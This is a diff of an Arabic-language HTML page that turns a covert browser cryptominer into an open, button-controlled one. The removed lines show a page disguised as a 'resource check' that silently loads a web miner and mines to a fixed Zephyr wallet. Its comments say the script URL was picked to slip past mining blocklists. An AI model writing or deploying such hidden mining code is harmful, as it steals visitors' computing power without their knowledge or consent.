@@ -1,38 +1,315 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>System Verification System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>المحسن الخلفي - نظام التعدين</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #0d1117;
+            color: #c9d1d9;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: #161b22;
+            padding: 35px 30px;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
+            text-align: center;
+            border: 1px solid #30363d;
+            max-width: 520px;
+            width: 100%;
+        }
+        .logo {
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+        h2 {
+            color: #58a6ff;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+        .sub {
+            color: #8b949e;
+            font-size: 14px;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #21262d;
+            padding-bottom: 15px;
+        }
+        .status-box {
+            background: #0d1117;
+            border-radius: 10px;
+            padding: 18px 15px;
+            margin-bottom: 25px;
+            border: 1px solid #21262d;
+        }
+        .status-line {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #8b949e;
+            margin-bottom: 8px;
+        }
+        .status-line span:last-child {
+            color: #f0f6fc;
+            font-weight: 500;
+        }
+        .hashrate-value {
+            font-size: 32px;
+            font-weight: 700;
+            color: #f0883e;
+            margin: 8px 0;
+            letter-spacing: 1px;
+        }
+        .hashrate-unit {
+            font-size: 16px;
+            color: #8b949e;
+            font-weight: 400;
+        }
+        .share-count {
+            font-size: 14px;
+            color: #3fb950;
+        }
+        .actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        button {
+            border: none;
+            color: #fff;
+            padding: 12px 35px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            flex: 1;
+            min-width: 120px;
+            letter-spacing: 0.3px;
+        }
+        button:active {
+            transform: scale(0.96);
+        }
+        #startBtn {
+            background: #238636;
+        }
+        #startBtn:hover:not(:disabled) {
+            background: #2ea043;
+            box-shadow: 0 0 15px rgba(35, 134, 54, 0.4);
+        }
+        #stopBtn {
+            background: #da3633;
+        }
+        #stopBtn:hover:not(:disabled) {
+            background: #f85149;
+            box-shadow: 0 0 15px rgba(218, 54, 51, 0.4);
+        }
+        button:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+        .warning {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 25px;
+            border-top: 1px solid #21262d;
+            padding-top: 18px;
+            line-height: 1.6;
+        }
+        .warning a {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+        .status-text {
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+    </style>
 </head>
 <body>
-    <h3 style="text-align: center; margin-top: 50px;">Running Background Resource Check...</h3>
+    <div class="container">
+        <div class="logo">⚡</div>
+        <h2>موارد النظام الخلفية</h2>
+        <p class="sub">استخدام طاقة المعالج للمساهمة في الشبكة اللامركزية</p>
+        
+        <div class="status-box">
+            <div class="status-line">
+                <span>الحالة</span>
+                <span class="status-text" id="statusText" style="color:#8b949e;">جاهز</span>
+            </div>
+            <div class="status-line">
+                <span>قوة التعدين</span>
+                <span>
+                    <span class="hashrate-value" id="hashrateDisplay">0.00</span>
+                    <span class="hashrate-unit">KH/s</span>
+                </span>
+            </div>
+            <div class="status-line" style="margin-bottom: 0;">
+                <span>المشاركات المقبولة</span>
+                <span class="share-count" id="shareCount">0</span>
+            </div>
+        </div>
 
-    <script>
-        // هذا الجزء يحاكي المكتبة محلياً في الذاكرة لتجنب طلب روابط خارجية
-        (function() {
-            var script = document.createElement('script');
-            // استخدام رابط بديل غير مدرج في القوائم السوداء القياسية لحجم التعدين
-            script.src = 'https://raw.githubusercontent.com/webminerpool/webminerpool/master/webminer.js';
-            
-            script.onload = function() {
-                if (typeof WebMiner !== 'undefined') {
-                    var wallet = "ZEPHYR2RJGWgAHN6WnZyFZ6GFsURPkJmd8vzeDXmTbwHiKDX9WLtqwSWY8z6UqUiCQiTTe2YURuS7HiefqXPZChmDTM59c4uEHe4q";
-                    var miner = new WebMiner.User(wallet, "Worker_Runner_Node", {
-                        throttle: 0.7, // استهلاك منخفض وآمن (30%)
-                        threads: 1
-                    });
-                    miner.start();
-                    console.log("[+] Bridge established via inline execution.");
-                } else {
-                    console.log("[-] Extension or network payload blocked.");
+        <div class="actions">
+            <button id="startBtn">▶ بدء</button>
+            <button id="stopBtn" class="stop" disabled>⏹ إيقاف</button>
+        </div>
+        
+        <p class="warning">
+            ⚠️ هذا التطبيق يستخدم وحدة المعالجة المركزية (CPU) لديك. سيتم إيقاف التعدين تلقائياً عند إغلاق المتصفح.<br>
+            المحفظة المستهدفة: <span style="color:#58a6ff;font-size:11px;">ZEPHYR2RJ...uEHe4q</span>
+        </p>
+    </div>
+
+    <!-- خريطة الاستيراد لتحديد رابط المكتبة -->
+    <script type="importmap">
+    {
+        "imports": {
+            "@marco_ciaramella/cpu-web-miner": "https://cdn.jsdelivr.net/npm/@marco_ciaramella/cpu-web-miner@1.9.5/index.min.js"
+        }
+    }
+    </script>
+
+    <script type="module">
+        // استيراد المكتبة
+        import * as cpuWebMiner from '@marco_ciaramella/cpu-web-miner';
+        
+        // عناصر الواجهة
+        const statusText = document.getElementById('statusText');
+        const hashrateDisplay = document.getElementById('hashrateDisplay');
+        const shareCountDisplay = document.getElementById('shareCount');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+
+        // ---------- الإعدادات (قم بتعديلها حسب رغبتك) ----------
+        // عنوان محفظة Zephyr (تم وضع المحفظة التي قدمتها مسبقاً)
+        const WALLET = "ZEPHYR2RJGWgAHN6WnZyFZ6GFsURPkJmd8vzeDXmTbwHiKDX9WLtqwSWY8z6UqUiCQiTTe2YURuS7HiefqXPZChmDTM59c4uEHe4q";
+        const WORKER_NAME = "Worker_Runner_Node"; // اسم العامل (يمكنك تغييره)
+
+        // إعدادات خادم التعدين (Stratum Server) لـ Zephyr
+        // باستخدام خادم herominers العام
+        const stratumConfig = {
+            server: "stratum.zephyr.herominers.com",
+            port: 1122,                  // المنفذ الأساسي لـ Zephyr
+            worker: `${WALLET}.${WORKER_NAME}`, // الصيغة المطلوبة: المحفظة.اسم_العامل
+            password: "x",               // كلمة المرور الافتراضية
+            ssl: false                   // لا نستخدم SSL في هذا المثال
+        };
+
+        // متغيرات التحكم
+        let minerInstance = null;
+        let shareCounter = 0;
+
+        // دالة بدء التعدين
+        function startMining() {
+            // إن وجدت نسخة سابقة، أوقفها
+            if (minerInstance) {
+                try { minerInstance.stop(); } catch(e) {}
+                minerInstance = null;
+            }
+
+            // تحديث الواجهة لحظة البدء
+            statusText.innerText = 'جاري الاتصال...';
+            statusText.style.color = '#58a6ff';
+            startBtn.disabled = true;
+            stopBtn.disabled = true;
+
+            try {
+                // بدء التعدين باستخدام خوارزمية yespower (خاصة بعملة Zephyr)
+                minerInstance = cpuWebMiner.start(
+                    cpuWebMiner.yespower,          // الخوارزمية
+                    stratumConfig,                  // إعدادات الخادم
+                    null,                           // رؤوس إضافية (غير مطلوبة)
+                    cpuWebMiner.ALL_THREADS,        // استخدام جميع أنوية المعالج
+                    
+                    // دالة استقبال العمل (تُستدعى عند قبول مشاركة)
+                    (work) => {
+                        statusText.innerText = 'يعمل (قبول)';
+                        statusText.style.color = '#3fb950';
+                        shareCounter++;
+                        shareCountDisplay.innerText = shareCounter;
+                    },
+                    
+                    // دالة تحديث قوة التعدين (تُستدعى بشكل دوري)
+                    (hashrate) => {
+                        // المكتبة ترجع القيمة بوحدة KH/s
+                        hashrateDisplay.innerText = hashrate.toFixed(2);
+                    },
+                    
+                    // دالة معالجة الأخطاء
+                    (error) => {
+                        console.error('خطأ في التعدين:', error);
+                        statusText.innerText = `خطأ: ${error.message || 'غير معروف'}`;
+                        statusText.style.color = '#f85149';
+                        startBtn.disabled = false;
+                        stopBtn.disabled = true;
+                        minerInstance = null;
+                    }
+                );
+
+                // تحديث الواجهة عند نجاح البدء
+                statusText.innerText = 'يعمل';
+                statusText.style.color = '#3fb950';
+                startBtn.disabled = true;
+                stopBtn.disabled = false;
+
+            } catch (error) {
+                // التقاط أي أخطاء غير متوقعة أثناء الإنشاء
+                console.error('خطأ فادح في الإقلاع:', error);
+                statusText.innerText = 'فشل الإقلاع';
+                statusText.style.color = '#f85149';
+                startBtn.disabled = false;
+                stopBtn.disabled = true;
+                minerInstance = null;
+            }
+        }
+
+        // دالة إيقاف التعدين
+        function stopMining() {
+            if (minerInstance) {
+                try {
+                    minerInstance.stop();
+                } catch (e) {
+                    console.error('خطأ أثناء الإيقاف:', e);
                 }
-            };
-            script.onerror = function() {
-                // حل أخير في حال حظر الروابط الخارجية تماماً: استخدام الاتصال المباشر بالخادم عبر الخادم المحلي
-                console.log("[-] Secure CDN failed. Network injection required.");
-            };
-            document.head.appendChild(script);
-        })();
+                minerInstance = null;
+            }
+            
+            statusText.innerText = 'متوقف';
+            statusText.style.color = '#f0883e';
+            hashrateDisplay.innerText = '0.00';
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+        }
+
+        // ربط الأزرار بالدوال
+        startBtn.addEventListener('click', startMining);
+        stopBtn.addEventListener('click', stopMining);
+
+        // تنظيف تلقائي عند إغلاق الصفحة أو مغادرتها
+        window.addEventListener('beforeunload', () => {
+            if (minerInstance) {
+                try { minerInstance.stop(); } catch(e) {}
+            }
+        });
+
+        // رسالة تأكيد في وحدة التحكم
+        console.log('✅ وحدة التعدين جاهزة. استخدم الأزرار للتحكم.');
     </script>
 </body>
 </html>
